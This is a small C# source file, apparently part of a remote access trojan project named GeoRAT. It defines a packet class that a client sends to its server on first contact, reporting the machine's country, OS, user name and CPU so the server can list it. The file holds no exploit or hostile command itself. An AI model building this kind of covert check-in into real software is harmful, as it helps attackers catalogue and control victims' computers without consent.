using System;


namespace GeoRAT.Core.PacketStruct
{
    //This is packet structure client-server exchange at first, Actually client sends such class to server and server adds client to listview based on it
  public class Info
    {

        public string Country { get;  set; }
        public string OS { get;  set; }
        public string UserName { get;  set; }
        public string CPU { get; set; }
        public Info(string country, string os, string username, string cpu)
        {
            Country = country;
            OS = os;
            UserName = username;
            CPU = cpu;

        }

        //Parameterless constructor 
        public Info()
        {

        }


        //for debug purpose 
        public override string ToString()
        {
            return Country + Environment.NewLine + OS + Environment.NewLine + UserName;

        }

       
    }
}
